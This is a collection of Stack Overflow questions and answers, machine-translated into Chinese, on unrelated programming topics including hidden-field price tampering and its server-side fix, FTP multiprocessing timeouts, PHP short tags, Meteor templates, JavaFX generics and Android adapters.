.pageTwo {background-image: url('../img/cream_sandwich.png');}
.pageThree {background-image: url('../img/cream_sand.png');} 
```

# web-applications - 在 Web 应用程序中做某事的安全方式

> ID：14220496
> 
> 赞同：1
> 
> 时间：2013-01-08T17:15:22.970
> 
> 标签：web-applications, security

在黑客挑战中，我发现了以下内容：

```
<input type="hidden" value="1500" name="price"> 
```

如果您足够聪明，可以更改价值（由 Web 应用程序的客户端强加）..您可以更改商品的价格。我想知道..我怎样才能使那行代码更安全？我想你应该从服务器端强加价格作为开始..任何关于如何处理此类问题的建议都非常受欢迎..非常感谢..

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-08T17:20:05.753

不要在客户端包含它。为什么价格应该是客户端的，而不是首先显示给用户？（实际上，将价格提供给客户并没有什么坏处……您希望您的客户看到价格，但实际上***相信***价格是准确的并且没有被篡改是愚蠢的。

在处理订单中的商品时，您应该根据 ItemId 查找价格，而不是接受来自客户端的价格。任何客户端数据都被自动视为不受信任，应进行验证。在上下文中，假设这是一个项目并且您正在单击“添加到购物车”选项，那么接受隐藏字段值是正确的价格将是愚蠢的。 ***在这种情况下，验证它意味着不仅要确保它是十进制数字，还要确保实际价格。***

相反，该项目应该有一个 ID，服务器端的调用将使用该 ID 在 Products 表中查找价格，并使用从 Products 表中检索到的经过验证的价格。

即使您要加密价格，您也必须假设它已被篡改。这是在初始设计阶段应实施安全和常识的明显案例之一。如果是这样，那么这样的事情一开始就不会成为代码。

* * *

综上所述，将其放在那里可能是合法的商业原因，而与订购过程无关。也许开发团队希望通过隐藏字段将其公开。如果他们希望价格可以通过 javascript 或其他方式读取，那么让其可用是有意义的……例如，对于在数量更改时调整价格的客户端功能来说。我不确定我会这样做，但在那种情况下，它没有害处。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-08T17:21:54.723

通常，您会在网页上显示价格，以便用户知道他们支付了多少，但价格的最终确定仍来自服务器上的价格数据库。

如果您正在进行大量价格变化，您可以这样做，以便在用户查看价格和点击购买之间的价格变化时通知用户。

如果最终价格包含在网页中，它只是邀请人们设置自己的价格。如果您打算这样做，您不妨做广告并获得这样的功能所暗示的额外业务。

如果您是黑客，我建议您戴上白帽子并通过电子邮件向网站所有者发送电子邮件，让他们知道他们遇到了问题。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-08T17:29:14.367

我已经看到了这个 hack 的一个版本，其中价格设置为负数；当购物车总计时，这意味着黑客可以获得免费的东西。

例如，如果页面允许您为电视设置 -5,000 英镑的价格，那么我可以将 5,001 英镑的商品添加到我的购物车中，并且只需向您的网站支付 1 英镑

它无助于解决您的问题，但正如这里的其他帖子所说，您真的不应该相信来自您网页的价格。当您计算任何价格时，您应该从产品数据库中获取值，希望那里没有价格为 - 5,000 英镑的产品......

# python - 避免子进程超时

> ID：14220505
> 
> 赞同：1
> 
> 时间：2013-01-08T17:15:48.327
> 
> 标签：python

好的，所以我目前正在使用 python 脚本一次将多个文件上传到给定的服务器。

我正在运行 python 版本 2.7.3。

```
def upload(t):
    server="server"
    user="user"
    password="password"
    service="service"
    ftp=ftplib.FTP(server)
    ftp.login(user=user,passwd=password,acct="")
    ftp.storbinary("STOR "+t.split('/')[-1], open(t,"rb"))
    print "{} has been uploaded to {}".format(t.split("/")[-1],service)
def ftp_upload(t=files):
    server="server"
    user="user"
    password="password"
    service="service"
    ftp.login(user=user,passwd=password,acct="")
    pool=multiprocessing.Pool(processes=4)
    pool.map(upload,t) 
```

但是，我收到错误消息，因为发生套接字超时或其他事情（当我只使用 ftp 控制台命令时不会发生这种情况）。

似乎 subprocess 做了一些不同的事情？我什至不特别关心监控它。事实上，如果我与服务器的连接被弄乱了，我宁愿进程不要终止。任何报告都是肉汁。

错误信息：

```
 File "/usr/bin/jat", line 301, in ftp_upload
    pool.map(upload,files_to_upload)
  File "/usr/lib/python2.7/multiprocessing/pool.py", line 227, in map
    return self.map_async(func, iterable, chunksize).get()
  File "/usr/lib/python2.7/multiprocessing/pool.py", line 528, in get
    raise self._value
socket.timeout: timed out 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-07-10T22:46:26.307

pool.Map() 将异常从它管理的子进程传播到主进程。请注意，异常是从 multiprocessing/pool.py 报告的，并且回溯以“raise self._value”结尾。

该行表示 socket.timeout 正在其中一个子进程中引发。我怀疑是您的 ftp.login 超时。根据[ftplib 文档](https://docs.python.org/2/library/ftplib.html)，如果您在创建对象时未指定全局默认超时，则 FTP 对象将使用全局默认超时。

附带说明一下，当子进程中发生异常时，我建议使用[此问题](https://stackoverflow.com/questions/6126007/python-getting-a-traceback-from-a-multiprocessing-process)的回答者建议的一种方法将更多细节传递回您的主线程。

# icons - Komodo Edit 上“Places”中的只读文件图标

> ID：14220506
> 
> 赞同：1
> 
> 时间：2013-01-08T17:15:59.900
> 
> 标签：icons, readonly, komodoedit

我正在尝试更改“地点”中只读文件的图标。我想查看只读文件的锁定图标，例如选项卡图标。

![在此处输入图像描述](../Images/c354ec79b67769b58e9b4053eae2a8e6.png)

我应该如何处理这个？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-28T21:50:41.407

使用具有以下内容的自定义样式表：

```
@lockedimage: url('chrome://komodo/skin/images/locked-file_icon.png');

tab[widget="openfilesViewbox"] 
  {
  .tab-icon[alt="Places"] 
    {
    list-style-image: @lockedimage !important;
    }  
  } 
```

**参考**

*   [使用 userChrome.css 自定义 Komodo](http://community.activestate.com/faq/customizing-komodo-ui)

*   [科莫多文件位置](http://community.activestate.com/faq/komodo-file-locations)

*   [科莫多图像存储库](http://svn.openkomodo.com/openkomodo/browse/openkomodo/trunk/src/chrome/komodo/skin/images)

*   [科莫多图标样式表](http://svn.openkomodo.com/openkomodo/view/openkomodo/trunk/src/chrome/komodo/skin/plat/shared/icons.less)

*   [科莫多图标变量](http://svn.openkomodo.com/openkomodo/view/openkomodo/trunk/src/chrome/komodo/skin/plat/shared/_config/icons.less)

# objective-c - 如何从xcode中的tableview中删除本地通知

> ID：14220507
> 
> 赞同：-3
> 
> 时间：2013-01-08T17:16:02.253
> 
> 标签：objective-c, ios, cocoa-touch, uilocalnotification

在我的应用程序中，我在表格视图中显示本地通知。

这是代码：

```
NSArray *notificationArray=[[UIApplication sharedApplication] scheduledLocalNotifications];
UILocalNotification *notif = [notificationArray objectAtIndex:indexPath.row];
[cell.textLabel setText:notif.alertBody];
[cell.detailTextLabel setText:[notif.fireDate description]]; 
```

我想从表格视图中删除选定的行，我该怎么办？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-08T17:21:13.007

如果要删除行...从模型中删除。

```
[yourModelArray removeObjectAtIndex:indexPath.row]; 
```

编辑：

重新加载表格视图：

```
[tableView reloadData]; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-08T17:29:24.600

如果您询问如何删除特定的本地通知，当用户点击特定单元格时：

```
- (void)tableView:(UITableView *)tableView didSelectRowAtIndexPath:(NSIndexPath *)indexPath
{
    NSArray *notificationArray=[[UIApplication sharedApplication] scheduledLocalNotifications];
    UILocalNotification *notificationToCancel= [notificationArray objectAtIndex:indexPath.row];

    [[UIApplication sharedApplication] cancelLocalNotification:notificationToCancel];
    [yourTable reloadData];
} 
```

# android - 动画列表 (animationDrawable) 自动启动

> ID：14220517
> 
> 赞同：10
> 
> 时间：2013-01-08T17:17:11.930
> 
> 标签：android, android-animation

是否可以`animation-list`在不使用 XML 膨胀后将 drawable 设置为自动启动`AnimationDrawable.start()`？

我的`animation-list`：

```
<?xml version="1.0" encoding="utf-8"?>
<animation-list xmlns:android="http://schemas.android.com/apk/res/android" android:oneshot="false">
    <item android:drawable="@drawable/download_light" android:duration="200" />
    <item android:drawable="@drawable/download20" android:duration="200" />
    <item android:drawable="@drawable/download40" android:duration="200" />
    <item android:drawable="@drawable/download60" android:duration="200" />
    <item android:drawable="@drawable/download80" android:duration="200" />
    <item android:drawable="@drawable/download_on" android:duration="300" />
</animation-list> 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2014-08-18T10:20:51.957

自动开启：

```
<ImageView
  android:layout_width="wrap_content"
  android:layout_height="wrap_content"
  android:src="@drawable/wave"
  android:layout_centerHorizontal="true"
  /> 
```

不自动启动：

```
<ImageView
  android:layout_width="wrap_content"
  android:layout_height="wrap_content"
  android:background="@drawable/wave"
  android:layout_centerHorizontal="true"
  /> 
```

这意味着当您将动画列表drawble设置为背景时，它不会自动启动，直到您调用`AnimationDrawable.start()`. 希望这可以帮到你。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2018-03-01T03:06:31.787

在一些具有不同 API 的设备上测试后，我发现：
**不**使用`AnimationDrawable.start()`

*   在几乎设备`animation-list` **中不会**自动启动
*   在少数设备（几乎是设备 4.4）**中会**自动启动

因此，我认为我们应该始终使用`AnimationDrawable.start()`and`AnimationDrawable.stop()`作为开始/停止动画

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2020-05-14T08:17:25.063

可以将AnimationDrawable设置为ProgressBar android:indeterminateDrawable，当ProgressBar可见时AnimationDrawable会自动启动

```
 <ProgressBar
        android:layout_width="match_parent"
        android:layout_height="match_parent"
        android:layout_gravity="center_horizontal"
        android:minWidth="1dp"
        android:minHeight="1dp"
        android:maxWidth="10000dp"
        android:maxHeight="10000dp"
        android:indeterminate="true"
        android:indeterminateBehavior="repeat"
        android:indeterminateDrawable="@drawable/indeterminate_progess_animation_drawable" /> 
```

# javascript - 创建自定义 html 输入

> ID：14220518
> 
> 赞同：0
> 
> 时间：2013-01-08T17:17:21.477
> 
> 标签：javascript, jquery, html, ajax, input

我想创建自己的 html 数字输入并在我的 html 页面中重用它。
声明类似的东西，例如：

```
<input controlname="numberInput" type="text" onkeydown="return ValidateNumber(event);" onblur="ReturnToDefaultValue(this);" value="0"/> 
```

然后在下面重用它：

```
<div>
    <input type="numberInput" id="number1" />
    <input type="numberInput" id="number2" /> 
    <input type="numberInput" id="number3" /> 
</div> 
```

有人可以提供一些东西吗？
谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-08T17:24:24.177

给你的输入一个类。

```
<input type="number" class="special_input"> 
```

然后添加适当的 jQuery。

```
$(function() {
  $("input.special_input").keydown(function(event) {
    return validateNumber(event);
  });
  $("input.special_input").blur(function(event) {
    returnToDefaultValue(this);
  });
}); 
```

...例如。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-08T17:26:31.147

最好的方法是向输入添加一个类并给它们一个正常的`type`（如“文本”）。然后，您可以使用 JavaScript 将行为添加到其中。

示例（使用 jQuery）：

```
 $('.numberInput')
   .on('blur', returnToDefaultValue)
   .on('keydown', function(e) { validateNumber(e);}); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-08T17:27:26.750

将 jquery 添加到您的页面`<script src="jquery.js" />`然后粘贴 HTML，并添加如下脚本标记：

```
<script>
    $(function(){
        $(".controlNumber")
        .blur(function(e){ 
            ///blur stuff
        })
        .keydown(function(e) {
            //keydown stuff
        });
</script> 
```

然后你输入应该有一个名为的类`controlNumber`

```
<input type="text" class="controlNumber" /> 
```

使用 class 还为您提供了一种简单的方法来设置所有`controlNumber`'s

# asp.net - 如何将 DisplayFormatString 应用于 DevExpress ASPxTreeList 中的列？

> ID：14220520
> 
> 赞同：2
> 
> 时间：2013-01-08T17:17:28.263
> 
> 标签：asp.net, devexpress

我尝试了几种似乎不起作用的方法：

```
 ASPxTreeList asdf = new ASPxTreeList();
        (asdf.Columns[0] as TreeListDataColumn).PropertiesEdit.DisplayFormatString = "C";
        (asdf.Columns[0] as TreeListTextColumn).PropertiesEdit.DisplayFormatString = "{0:C}";
        (asdf.Columns[0] as TreeListDataColumn).DisplayFormat = "{0:C}";
        (asdf.Columns[0] as TreeListTextColumn).DisplayFormat = "C"; 
```

我仍然需要尝试将其设为数字​​列：[https ://www.devexpress.com/Support/Center/p/Q108195.aspx](https://www.devexpress.com/Support/Center/p/Q108195.aspx)

我可以使用 ASPxTreeList.HtmlDataCellPrepared 事件： http: [//www.devexpress.com/Support/Center/p/Q356689.aspx](http://www.devexpress.com/Support/Center/p/Q356689.aspx)但我将其保留为最后的手段，因为它过去一直很慢。

我可以创建一个单独的数据源并在数据绑定之前手动格式化它，但这也是最后的手段。

我没有专门在 DataSource 中设置任何列数据类型。

任何帮助，将不胜感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-08T17:26:23.907

问题在于您所说的“我没有专门在 DataSource 中设置任何列数据类型”。如果在数据表中设置数据类型，然后使用：

```
PropertiesEdit.DisplayFormatString = "N2"; 
```

它应该工作。

# oracle - 存储过程总是返回“进程退出”错误

> ID：14220522
> 
> 赞同：0
> 
> 时间：2013-01-08T17:17:31.350
> 
> 标签：oracle, plsql, oracle-sqldeveloper

我正在研究类似于下面的表结构并尝试获得上述输出。

![在此处输入图像描述](../Images/e9d53699b74a0af174238cefe6d12684.png)

为了实现这一点，我编写了以下 PL SQL 过程：

```
 CREATE OR replace PROCEDURE Sample_procedure
AS
  TYPE list_of_names_t
    IS TABLE OF emp.emp_index%TYPE;
  processedindexes LIST_OF_NAMES_T := List_of_names_t();
  flag             emp.emp_index%TYPE;
  CURSOR c1 IS
    SELECT *
    FROM   emp
    WHERE  Trim(emp_id) = 'AAAAA'
    ORDER  BY last_maint_ts ASC;
BEGIN
    dbms_output.Put('Entered the loop');

    FOR rec IN c1 LOOP
        SELECT emp_index
        INTO   flag
        FROM   emp
        WHERE  emp_id = rec.emp_id
               AND last_maint_ts > rec.last_maint_ts;

        IF flag IS NOT NULL THEN
          processedindexes.extend;

          Processedindexes(processedindexes.last) := flag;

          processedindexes.extend;

          Processedindexes(processedindexes.last) := rec.emp_index;

          dbms_output.Put('The indexes'
                          ||rec.emp_index
                          ||' & '
                          ||flag
                          ||'refer to same emp ID');

          exit;

          dbms_output.Put('received NULL');
        END IF;
    END LOOP;
END; 
```

1）每次，我运行这个我都会得到输出，因为进程在sql developer中退出，对此有什么建议吗？

***注意：***我是 PL SQL 编程的新手，如果我解决这个问题的方法不正确，请纠正我。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-08T17:20:31.430

打开 sqlplus 并执行以下命令：-

```
set serveroutput on
exec Sample_procedure; 
```

如果您的程序编译正常，它应该在 dbms_output.put 中显示输出

# php - 内联 PHP 被转换为注释标签

> ID：14220524
> 
> 赞同：0
> 
> 时间：2013-01-08T17:17:33.713
> 
> 标签：php

这是我见过的最随机的事情，但是当我使用以下简单方法在页面中打印变量时：

```
<?= $appCnt ?>
<? echo $appCnt ?> 
```

它被渲染为：

```
<!--?= $appCnt ?-->
<!--? echo $appCnt ?--> 
```

我已经重新安装了 PHP，但页面上的其他任何地方都可以正常工作。如果我在页面加载之前回显它，它会很好地呈现，但我什至在页面中有其他东西可以正确呈现。

如果我执行以下操作，它会起作用，但究竟为什么会这样？

```
<?php echo $appCnt ?> 
```

谢谢你的帮助。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-08T17:18:30.500

我相信您需要启用短打开标签

[http://php.net/manual/en/ini.core.php#ini.short-open-tag](http://php.net/manual/en/ini.core.php#ini.short-open-tag)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-08T17:18:40.833

您是否检查过是否`short_open_tag`已在 PHP 中启用？或者，您使用的是 PHP >= 5.4？

# networking - TCP 连接持久性

> ID：14220525
> 
> 赞同：-1
> 
> 时间：2013-01-08T17:17:34.597
> 
> 标签：networking, tcp, persistence, middleware

我有一个客户端连接到服务器（TCP）并轮询数据。每当连接断开时，我都需要重新启动客户端。

我想知道是否可以在客户端计算机（Windows）上安装任何代理，即使连接在另一端断开，也可以保持该套接字打开？

客户端本身无法自动恢复连接。这就是为什么我正在考虑一个可以把它放在一边的中间件：

```
 client ---> middleware ---> server   <- Normal operation

    client ---> middleware -/-> server   <- External failure

    client ---> middleware ---> server   <- We get back up 
```

无需每次都重新启动客户端。

谢谢，

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-08T17:26:05.857

重新启动客户端是矫枉过正。让客户端连接到服务器，然后发送/接收数据。如果发送或接收失败，请检查错误并关闭/打开与服务器的连接并重新发送/重新接收。

简单的 ：）

# php - CWebUser 中的 setState 和 CUserIdenitity 在示例中搞砸了

> ID：14220527
> 
> 赞同：0
> 
> 时间：2013-01-08T17:17:39.987
> 
> 标签：php, yii

我看到了几个（几乎等价的）关于如何`Yii::app()->user`在 Yii 中扩展信息的示例。这是[其中之一](http://www.yiiframework.com/wiki/6/how-to-add-more-information-to-yii-app-user/)。

代码（原样）：

```
class UserIdentity extends CUserIdentity
{
    private $_id;

    public function authenticate()
    {
        $user=User::model()->findByAttributes(array('username'=>$this->username));
        if($user===null)
            $this->errorCode=self::ERROR_USERNAME_INVALID;
        else if($user->password!==md5($this->password))
            $this->errorCode=self::ERROR_PASSWORD_INVALID;
        else
        {
            $this->_id=$user->id;
            $this->setState('lastLoginTime', $user->lastLoginTime); // added property
            $this->errorCode=self::ERROR_NONE;
        }
        return !$this->errorCode;
    }

    public function getId()
    {
        return $this->_id;
    }
} 
```

可以肯定的是，之后我们可以`lastLoginTime`按如下方式访问这些值：

```
Yii::app()->user->lastLoginTime 
```

这里的问题是我们调用`setState`的`$this`是**CUserIdentity**，而CWebUser`Yii::app()->user`是**CWebUser**，默认情况下**CWebUser**没有任何对**CUserIdentity**的引用。

它们都确实支持通过 存储附加属性`setState`并通过 检索它们`getState`，但首先使用内部`_state`数组，第二个使用`$_SESSION`.

所以问题是 - 我们如何将扩展信息写入一个实体，然后从另一个实体中读取？我在 Yii 代码中看不到任何可以提供此功能的东西。它看起来像示例中的错误。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-08T18:12:56.430

当您调用登录方法时， `Yii::app()->user->login()`您必须传递一个 useridentity 对象，这基本上意味着 CWebuser 确实具有对 useridentity 的引用

```
Yii::app()->user->login($userIdentity,$duration); 
```

# meteor - 具有复杂对象的反应模板

> ID：14220529
> 
> 赞同：3
> 
> 时间：2013-01-08T17:17:41.540
> 
> 标签：meteor

我想根据这个文档渲染一个响应式模板：

```
Sprint: 
    WorkStories:
        Tasks 
```

我知道这可以通过为每个“级别”制作一个 Meteor 集合来完成，但这意味着结果实际上是作为单独的文档存储在数据库中的。我想知道是否有可能拥有一个集合/文档`Sprint`，该集合/文档具有标准`WorkStories`集合，每个集合都有一个标准集合`Tasks`，呈现为反应式模板。

我已经看过 [Meteor.deps.Context][1]，但我不知道如何连接它（或者即使它是正确的工具），而且没有一个示例做这样的事情。

我也看过 [this question][2]，但他似乎在询问连接相关但独立的文档，而不是呈现单个文档。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-08T19:07:08.567

因为[集合上的数据库查询已经](http://docs.meteor.com/#reactivity)是客户端上的反应变量，所以下面将呈现**一个** **嵌套**在模板中的嵌套**文档**`Sprint`： **`WorkStories` **`Tasks`****

 ****HTML：

```
<head>
    <title>Sprints Example</title>
</head>

<body>
    {{> sprints }}
</body>

<template name="sprints">
  {{#each items}}
    <div>Name: {{name}}</div>
        {{#each this.WorkStories}}
            <div>{{name}}</div>
            {{#each this.Tasks}}
                <div>{{name}}</div>
            {{/each}}
        {{/each}}
  {{/each}}
</template> 
```

Javascript：

```
Sprints = new Meteor.Collection("sprints");

if (Meteor.isClient) {
    Template.sprints.items = function () {
      return Sprints.find({});
  };
}

if (Meteor.isServer) {
    Meteor.startup(function () {
        if (Sprints.find().count() === 0) {
            Sprints.insert({ name: 'sprint1', WorkStories: [{ name: 'workStory1', Tasks: [{ name: 'task1' }, { name: 'task2' }, { name: 'task3' }] }, { name: 'workStory2', Tasks: [{ name: 'task1' }, { name: 'task2' }, { name: 'task3' }] }] });
        }
  });
} 
```

**更新答案**

根据下面@Paul-Young 的评论，我使用的问题`$set`是更新中缺少引号。一旦嵌套对象在 中呈现，`Template`从 Meteor 0.5.3 开始，您可以简单地更新子数组：

```
Sprints.update(Sprints.findOne()._id, { $set: { "WorkStories.0.name": "updated_name1" } }); 
```

**背景信息**

这确实加载了初始对象，但更新似乎有问题。我可以通过在控制台中调用以下命令来重新渲染模板：

```
Sprints.update(Sprints.findOne()._id, { name: 'sprint777', WorkStories: [{ name: 'workStory1232', Tasks: [{ name: 'task221' }, { name: 'task2' }, { name: 'task3' }] }, { name: 'workStory2', Tasks: [{ name: 'task1' }, { name: 'task2' }, { name: 'task3' }] }] }) 
```

[根据Meteor Docs](http://docs.meteor.com/#modifiers)，遵循以下规则：

> 但是，如果修饰符不包含任何 $ 运算符，那么它会被解释为文字文档，并完全替换数据库中先前的任何内容。（经过验证的更新当前不支持文字文档修饰符。

当然，您想要的是`$set`在嵌套文档上使用样式运算符，并让模板在其嵌套属性发生更改时重新呈现，**而无需**替换表中的整个文档。[Meteor 的 0.5.3 版本](https://github.com/meteor/meteor/blob/v0.5.3/History.md)包括搜索子数组的能力：

`Allow querying specific array elements (foo.1.bar).`

我尝试进行`.`子数组搜索，但还无法更新`WorkStories`原始实体的子文档，所以我在 google talk 中[发布了一个问题。](https://groups.google.com/forum/?fromgroups=#!topic/meteor-talk/bRIQCOHc99c)

希望这可以帮助****

# casting - 不知道如何转换值 java7

> ID：14220531
> 
> 赞同：1
> 
> 时间：2013-01-08T17:17:59.237
> 
> 标签：casting, javafx, java-7

自版本 4 以来我就没有使用过 java，并且铸造接缝已经改变到几乎令人讨厌的地步。我不明白如何处理以下编译错误。

> HelloWorld.java:70: 错误：没有找到适合 add(Series) lineChart.getData().add(series) 的方法；^ 方法 List.add(int,Series) 不适用（实际参数列表和形式参数列表长度不同） 方法 List.add(Series) 不适用（实际参数 Series 无法通过方法调用转换转换为 Series）

这是我的代码：

```
import javafx.application.Application;
import javafx.scene.Scene;
import javafx.scene.chart.LineChart;
import javafx.scene.chart.NumberAxis;
import javafx.scene.chart.XYChart;
import javafx.scene.chart.*;
import javafx.stage.Stage;
import javafx.geometry.Side;
import java.lang.*;
import java.net.*; 
import java.io.*;
import java.util.*;

public class HelloWorld extends Application {

    @Override public void start(Stage stage) {

        Vector <String[]>  v = new Vector<String[]>();

        try{

                File f = new File("audjpy.txt"); 
                BufferedReader br = new BufferedReader(new FileReader(f));
                String line;
                String[] data;
                int count = 0;
                while ((line = br.readLine()) != null) {
                        data = line.split(",");
                        if(count>0)v.add(data);
                        if(count == 400)break;
                        count++;
                }
                br.close();
        }catch(IOException e){System.out.println(e);}

        stage.setTitle("Line Chart Sample");
        //defining the axes
        NumberAxis xAxis = new NumberAxis();
        NumberAxis yAxis = new NumberAxis();
        yAxis.setSide(Side.RIGHT);
        xAxis.setLabel("Number of Month");
        //creating the chart
        final LineChart<Number,Number> lineChart = 
                new LineChart<Number,Number>(xAxis,yAxis);

        lineChart.setTitle("Stock Monitoring, 2010");

        //defining a series
        XYChart.Series<Double, Double> series = new XYChart.Series<Double, Double>();
        series.setName("My portfolio");

        //populating the series with data
        //<TICKER>,<DTYYYYMMDD>,<TIME>,<OPEN>,<HIGH>,<LOW>,<CLOSE>,<VOL>
    Enumeration<String[]> e = v.elements();
    while(e.hasMoreElements()){
        String[] data = e.nextElement();
            double x = Double.parseDouble(data[4]);
            double y = Double.parseDouble(data[5]);
            series.getData().add(new XYChart.Data<Double, Double>(x,y));
        }

        Scene scene  = new Scene(lineChart,800,600);
        lineChart.getData().add(1, series);

        stage.setScene(scene);
        stage.show();
    }

    public static void main(String[] args) {
        launch(args);
    }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-08T17:42:04.187

原因似乎是因为您正在使用`Double`并且`Number`可以互换，将每个泛型更改为`Number`并且您的问题应该得到解决。

```
@Override
public void start(Stage stage) {

    Vector<String[]> v = new Vector<String[]>();

    try {

        File f = new File("audjpy.txt");
        BufferedReader br = new BufferedReader(new FileReader(f));
        String line;
        String[] data;
        int count = 0;
        while ((line = br.readLine()) != null) {
            data = line.split(",");
            if (count > 0) {
                v.add(data);
            }
            if (count == 400) {
                break;
            }
            count++;
        }
        br.close();
    } catch (IOException e) {
        System.out.println(e);
    }

    stage.setTitle("Line Chart Sample");
    //defining the axes
    NumberAxis xAxis = new NumberAxis();
    NumberAxis yAxis = new NumberAxis();
    yAxis.setSide(Side.RIGHT);
    xAxis.setLabel("Number of Month");
    //creating the chart
    final LineChart<Number, Number> lineChart = new LineChart<Number, Number>(xAxis, yAxis);

    lineChart.setTitle("Stock Monitoring, 2010");

    //defining a series
    XYChart.Series<Number, Number> series = new XYChart.Series<Number, Number>();
    series.setName("My portfolio");

    //populating the series with data
    //<TICKER>,<DTYYYYMMDD>,<TIME>,<OPEN>,<HIGH>,<LOW>,<CLOSE>,<VOL>
    Enumeration<String[]> e = v.elements();
    while (e.hasMoreElements()) {
        String[] data = e.nextElement();
        double x = Double.parseDouble(data[4]);
        double y = Double.parseDouble(data[5]);
        series.getData().add(new XYChart.Data<Number, Number>(x,y));
    }

    Scene scene = new Scene(lineChart, 800, 600);
    lineChart.getData().add(1, series);

    stage.setScene(scene);
    stage.show();
} 
```

# android - 阵列适配器不工作

> ID：14220534
> 
> 赞同：0
> 
> 时间：2013-01-08T17:18:14.097
> 
> 标签：android, android-listview, android-arrayadapter, android-adapter, android-adapterview

我正在尝试使用数组适配器来填充我的列表视图。我构建了一个从 POJO 类到数组适配器的对象数组列表。当我尝试通过传递对象的arraylist 来实例化arrayadapter 类时，我在执行SETADAPTER 行时遇到空指针异常。

请指导我解决这个问题

```
private void initialize() {     
    listView=(ListView)findViewById(R.id.lvOpenTicketList);

    POJO_Ticket pojo_Ticket; 
    ArrayList<POJO_Ticket> ticketArray  = new ArrayList<POJO_Ticket>(); 

     for(int i=0;i<openTicketList.size();i++){ 
        pojo_Ticket = new POJO_Ticket(openTicketList.get(i));
        ticketArray.add(pojo_Ticket);    
        Log.i("OpenTicket","i = " + Integer.toString(i)); 
     }
        Log.i("OpenTicket","ticketArray  " + ticketArray.size()); 

        adapterTicketList=new AdapterTicketList(this, ticketArray);
        listView.setAdapter(adapterTicketList);
        listView.setOnItemClickListener(this);    
} 
```

* * *

```
public class AdapterTicketList extends ArrayAdapter<POJO_Ticket> {
Context context;
ArrayList<POJO_Ticket> ticketArray;
LayoutInflater vi;

public AdapterTicketList(Context context , ArrayList<POJO_Ticket> ticketArray) {    
    super(context, 0, ticketArray );    
    this.ticketArray = new ArrayList<POJO_Ticket>();    
    this.ticketArray.addAll(ticketArray);  
    this.context =context;
    Log.i("AdapterTicketList"," ticket id : " + ticketArray.get(0).getTicketObject().getId()); 
    vi = (LayoutInflater)context.getSystemService(Context.LAYOUT_INFLATER_SERVICE);  
    }  

private class ViewHolder {
    TextView tvTicketID;  
    TextView tvCreationHour;  
    TextView tvTableNumber;  
    TextView tvAmount;    
    } 

public View getView(final int position, View convertView, ViewGroup parent) {      
    ViewHolder holder;    
    if (convertView == null) { 
        holder = new ViewHolder();                   
        convertView = vi.inflate(R.layout.rowticket,  null);  
        holder.tvTicketID = (TextView) convertView.findViewById(R.id.tvTicketID); 
        holder.tvCreationHour = (TextView) convertView.findViewById(R.id.tvCreationHour); 
        holder.tvTableNumber = (TextView) convertView.findViewById(R.id.tvTableNumber); 
        holder.tvAmount = (TextView) convertView.findViewById(R.id.tvQuantity);  
        convertView.setTag(holder); 
    } else {
        holder = (ViewHolder) convertView.getTag();  
    }       
    Log.i("AdapterTicketList"," ticket id : " + ticketArray.get(position).getTicketObject().getId()); 
    holder.tvTicketID.setText(ticketArray.get(position).getTicketObject().getId()) ;  
    holder.tvCreationHour.setText(ticketArray.get(position).getTicketObject().getCreationHour()) ;  
    holder.tvTableNumber.setText(ticketArray.get(position).getTicketObject().getTableNumber()) ;   
    holder.tvAmount.setText(Double.toString(ticketArray.get(position).getTicketObject().getTotalAmount())) ; 
    return convertView; 
    } 
```

}

```
01-08 22:11:13.707: W/dalvikvm(7284): threadid=1: thread exiting with uncaught exception (group=0x2b542210)
01-08 22:11:13.717: E/AndroidRuntime(7284): FATAL EXCEPTION: main
01-08 22:11:13.717: E/AndroidRuntime(7284): java.lang.RuntimeException: Unable to start activity ComponentInfo{com.example.restaurent/com.example.restaurent.OpenTicketList}: java.lang.NullPointerException
01-08 22:11:13.717: E/AndroidRuntime(7284): at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:1967)
01-08 22:11:13.717: E/AndroidRuntime(7284): at android.app.ActivityThread.handleLaunchActivity(ActivityThread.java:1992)
01-08 22:11:13.717: E/AndroidRuntime(7284): at android.app.ActivityThread.access$600(ActivityThread.java:127)
01-08 22:11:13.717: E/AndroidRuntime(7284): at android.app.ActivityThread$H.handleMessage(ActivityThread.java:1158)
01-08 22:11:13.717: E/AndroidRuntime(7284): at android.os.Handler.dispatchMessage(Handler.java:99)
01-08 22:11:13.717: E/AndroidRuntime(7284): at android.os.Looper.loop(Looper.java:137)
01-08 22:11:13.717: E/AndroidRuntime(7284): at android.app.ActivityThread.main(ActivityThread.java:4441)
01-08 22:11:13.717: E/AndroidRuntime(7284): at java.lang.reflect.Method.invokeNative(Native Method)
01-08 22:11:13.717: E/AndroidRuntime(7284): at java.lang.reflect.Method.invoke(Method.java:511)
01-08 22:11:13.717: E/AndroidRuntime(7284): at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:784)
01-08 22:11:13.717: E/AndroidRuntime(7284): at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:551)
01-08 22:11:13.717: E/AndroidRuntime(7284): at dalvik.system.NativeStart.main(Native Method)
01-08 22:11:13.717: E/AndroidRuntime(7284): Caused by: java.lang.NullPointerException
01-08 22:11:13.717: E/AndroidRuntime(7284): at com.example.restaurent.OpenTicketList.initialize(OpenTicketList.java:67)
